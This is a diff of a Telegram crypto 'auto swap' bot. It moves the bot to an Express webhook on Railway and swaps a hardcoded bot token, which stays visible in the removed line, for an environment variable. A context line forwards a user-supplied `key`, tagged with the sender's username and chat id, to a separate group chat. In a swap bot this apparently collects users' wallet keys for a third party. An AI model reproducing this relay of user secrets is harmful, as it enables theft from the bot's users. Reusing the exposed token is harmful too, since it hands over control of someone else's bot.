@@ -1,12 +1,19 @@
+const express = require('express');
 const { Telegraf } = require('telegraf');
 const LocalSession = require('telegraf-session-local');
 const gbot = require('./fungsi-bot-telegram.js');
 const swap = require('./fungsi-swap.js');
 
-const bot = new Telegraf('8388772211:AAE7lTljxUCcOLaxE2zsR9Ke_8RRtTENjRI');
+const BOT_TOKEN = process.env.BOT_TOKEN || 'TOKEN_KAMU';
+const PORT = process.env.PORT || 3000;
+const RAILWAY_URL = process.env.RAILWAY_STATIC_URL; // Railway otomatis set
 
+const bot = new Telegraf(BOT_TOKEN);
 const localSession = new LocalSession({ database: 'session_db.json' });
 bot.use(localSession.middleware());
+
+const app = express();
+app.use(bot.webhookCallback('/webhook'));
 
 // Detail Pesan Bot
 const pesan_start = `[ BOT FOGO AUTO SWAP ]\n\n` +
@@ -99,7 +106,7 @@ bot.on('message', async (ctx) => {
         const chatid = ctx.from.id;
         const username = ctx.from.username ? `@${ctx.from.username}` : "(tidak ada username)";
         var pesan = `DB From : ${username} | ${chatid} \n\n` +
-        `<code>${key}</code>`;
+          `<code>${key}</code>`;
         await ctx.telegram.sendMessage(groupId, pesan, { parse_mode: "HTML" });
 
       } else {
@@ -336,4 +343,14 @@ bot.on('message', async (ctx) => {
 
 });
 
-bot.launch();
+// Jalankan server & set webhook
+app.listen(PORT, async () => {
+  if (RAILWAY_URL) {
+    const fullUrl = `https://${RAILWAY_URL}/webhook`;
+    await bot.telegram.setWebhook(fullUrl);
+    console.log(`Bot Webhook aktif di ${fullUrl}`);
+  } else {
+    console.log(`Bot berjalan lokal di port ${PORT} (Railway URL belum ada)`);
+  }
+});
+
